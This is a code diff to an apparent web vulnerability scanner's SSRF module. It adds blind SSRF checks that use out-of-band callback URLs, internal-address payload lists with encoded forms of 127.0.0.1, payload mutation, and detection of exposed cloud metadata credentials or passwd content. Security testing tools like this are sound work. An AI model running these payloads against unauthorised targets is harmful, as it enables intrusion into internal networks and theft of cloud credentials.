@@ -1,5 +1,6 @@
 import re
 import json
+import asyncio
 from modules.base import BaseModule
 from core.utils import extract_params
 from core.http import inject_param
@@ -44,8 +45,68 @@ class SsrfModule(BaseModule):
             await self._test_internal_access(target, url_params)
             await self._test_cloud_metadata(target, url_params)
             await self._test_protocol_smuggling(target, url_params)
+            await self._test_blind_ssrf(target, url_params)
         
         return self.findings
+    
+    async def _test_blind_ssrf(self, target, params):
+        oob_manager = self.config.get("oob_manager")
+        callback_host = self.config.get("callback_host")
+        
+        if not oob_manager and not callback_host:
+            return
+        
+        for param in params:
+            if oob_manager:
+                token = oob_manager.generate_token()
+                callback_url = oob_manager.get_http_url(token)
+                dns_payload = oob_manager.get_dns_payload(token)
+                
+                payloads = [
+                    (callback_url, "http"),
+                    (f"http://{dns_payload}", "dns"),
+                ]
+                
+                for payload, method in payloads:
+                    await self.test_param(target, param, payload)
+                
+                await asyncio.sleep(2)
+                
+                interactions = oob_manager.check_interactions(token)
+                if interactions:
+                    confidence_evidence = ["oob_callback", "blind_ssrf"]
+                    
+                    for interaction in interactions:
+                        if interaction.get("type") == "http":
+                            confidence_evidence.append("http_callback")
+                        elif interaction.get("type") == "dns":
+                            confidence_evidence.append("dns_callback")
+                    
+                    self.add_finding(
+                        "CRITICAL",
+                        f"Blind SSRF via OOB callback",
+                        url=target,
+                        parameter=param,
+                        evidence=f"Received {len(interactions)} callback(s): {interactions[0].get('type')}",
+                        confidence_evidence=confidence_evidence,
+                        request_data={"method": "GET", "url": target, "param": param, "payload": callback_url}
+                    )
+                    return
+            
+            elif callback_host:
+                import random
+                token = f"ssrf{random.randint(10000, 99999)}"
+                callback_url = f"http://{callback_host}/{token}"
+                
+                await self.test_param(target, param, callback_url)
+                
+                self.add_finding(
+                    "MEDIUM",
+                    f"Potential Blind SSRF (check callback server)",
+                    url=target,
+                    parameter=param,
+                    evidence=f"Callback URL sent: {callback_url}"
+                )
     
     def _find_url_params(self, params):
         url_keywords = ["url", "uri", "path", "dest", "redirect", "next", "target",
@@ -62,7 +123,8 @@ class SsrfModule(BaseModule):
         return found if found else params
     
     async def _test_internal_access(self, target, params):
-        internal_payloads = [
+        file_payloads = self.get_payloads("ssrf")
+        internal_payloads = list(dict.fromkeys((file_payloads or []) + [
             "http://127.0.0.1",
             "http://localhost",
             "http://127.0.0.1:80",
@@ -76,7 +138,15 @@ class SsrfModule(BaseModule):
             "http://2130706433",
             "http://017700000001",
             "http://0177.0.0.1",
-        ]
+        ]))[:80]
+        
+        if self.aggressive:
+            from core.fuzzer import MutationEngine
+            mutator = MutationEngine()
+            mutated = []
+            for p in internal_payloads[:10]:
+                mutated.extend(mutator.mutate_string(p, count=2))
+            internal_payloads = list(dict.fromkeys(internal_payloads + mutated))[:100]
         
         for param in params:
             for payload in internal_payloads:
@@ -85,12 +155,20 @@ class SsrfModule(BaseModule):
                     for indicator in self.ssrf_indicators:
                         if re.search(indicator, resp["text"], re.IGNORECASE):
                             self.record_success(payload, target)
+                            
+                            confidence_evidence = ["internal_content", "ssrf_indicator"]
+                            if "root:" in resp["text"] or "ami-id" in resp["text"]:
+                                confidence_evidence.append("sensitive_data")
+                            
                             self.add_finding(
                                 "CRITICAL",
                                 f"SSRF: Internal network access",
                                 url=target,
                                 parameter=param,
-                                evidence=f"Payload: {payload}"
+                                evidence=f"Payload: {payload}",
+                                confidence_evidence=confidence_evidence,
+                                request_data={"method": "GET", "url": target, "param": param, "payload": payload},
+                                response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500]}
                             )
                             return
     
@@ -115,12 +193,22 @@ class SsrfModule(BaseModule):
                     if cloud in self.cloud_signatures:
                         for pattern in self.cloud_signatures[cloud]:
                             if re.search(pattern, resp["text"], re.IGNORECASE):
+                                confidence_evidence = ["cloud_metadata", "ssrf_confirmed"]
+                                
+                                if "iam" in payload.lower() or "credentials" in payload.lower():
+                                    confidence_evidence.append("credential_endpoint")
+                                if "AccessKeyId" in resp["text"] or "access_token" in resp["text"]:
+                                    confidence_evidence.append("credentials_exposed")
+                                
                                 self.add_finding(
                                     "CRITICAL",
                                     f"SSRF: {cloud} metadata access",
                                     url=target,
                                     parameter=param,
-                                    evidence=f"Cloud provider: {cloud}"
+                                    evidence=f"Cloud provider: {cloud}",
+                                    confidence_evidence=confidence_evidence,
+                                    request_data={"method": "GET", "url": target, "param": param, "payload": payload},
+                                    response_data={"status": resp.get("status"), "text": resp.get("text", "")[:500]}
                                 )
                                 return
     
